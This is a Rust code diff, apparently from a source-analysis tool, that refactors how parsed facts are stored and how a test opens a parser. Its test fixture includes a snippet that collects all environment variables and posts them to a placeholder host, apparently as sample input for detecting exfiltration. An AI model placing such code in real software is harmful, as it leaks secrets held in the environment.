@@ -154,8 +154,14 @@ pub(super) fn execution_facts(root: Node<'_>, source: &str, values: &mut crate::
         value_key!("source.rust.modules"),
         serde_json::json!(modules),
     );
-    values.insert("source.rust.proc_macro", serde_json::json!(proc_macro));
-    values.insert("source.rust.initializers", serde_json::json!(initializers));
+    values.insert_key(
+        value_key!("source.rust.proc_macro"),
+        serde_json::json!(proc_macro),
+    );
+    values.insert_key(
+        value_key!("source.rust.initializers"),
+        serde_json::json!(initializers),
+    );
 }
 
 pub(super) fn resolve_calls(symbols: &mut Symbols) {
@@ -188,15 +194,15 @@ pub(super) fn resolve_calls(symbols: &mut Symbols) {
 
 #[cfg(test)]
 mod tests {
-    use crate::{Symbol, open_with_path};
+    use crate::{OpenOptions, Symbol};
     use std::path::Path;
     #[test]
     fn rust_grouped_aliases_scoped_calls_and_let_binds() {
-        let parsed=open_with_path(Path::new("lib.rs"),br#"
+        let parsed=OpenOptions::new().path(Path::new("lib.rs")).open(br#"
 use std::{env::{vars as environment}, fs};
 use reqwest::blocking::Client;
 fn run() { let data=environment(); let client=Client::new(); client.post("https://example.invalid").json(&data).send(); }
-"#).unwrap();
+"#);
         let imports = parsed
             .symbols()
             .iter()
